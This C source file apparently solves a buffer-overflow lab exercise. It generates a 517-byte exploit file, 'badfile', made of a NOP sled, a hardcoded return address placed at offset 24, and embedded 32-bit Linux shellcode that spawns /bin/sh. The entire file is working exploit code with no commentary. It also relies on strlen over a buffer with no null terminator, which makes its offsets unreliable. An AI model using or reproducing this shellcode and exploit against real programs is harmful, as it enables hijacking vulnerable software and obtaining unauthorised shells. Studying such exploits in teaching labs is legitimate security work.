#include <stdio.h>
#include <stdlib.h>
#include <string.h>

char shellcode[] =
	"\x31\xc0"
	"\x31\xdb"
	"\xb0\xdb"
	"\xcd\x80"
	"\x31\xc0"
	"\x50"
	"\x68""//sh"
	"\x68""/bin"
	"\x89\xe3"	
	"\x50"
	"\x53"
	"\x89\xe1"
	"\x99"
	"\xb0\x0b"
	"\xcd\x80"
;

int main(int argc, char **argv){
	char buf[517];
	FILE *badfile;
	memset(&buf, 0x90, 517);

	/* here */
	int ret = 0xffffd338 + strlen(buf) - strlen(shellcode);
	
	char data[sizeof(int)];	
	memcpy(data, &ret, sizeof(int));
	for(int i = 0; i < sizeof(int); i++){
		buf[24+i] = data[i];
	}

	/* insert shell code */	
	for(int i = 0; i < strlen(shellcode); i++){
		buf[strlen(buf) - strlen(shellcode) + i] = shellcode[i];
	}

	badfile = fopen("./badfile_2016015878", "w");
	fwrite(buf, 517, 1, badfile);
	fclose(badfile);
}
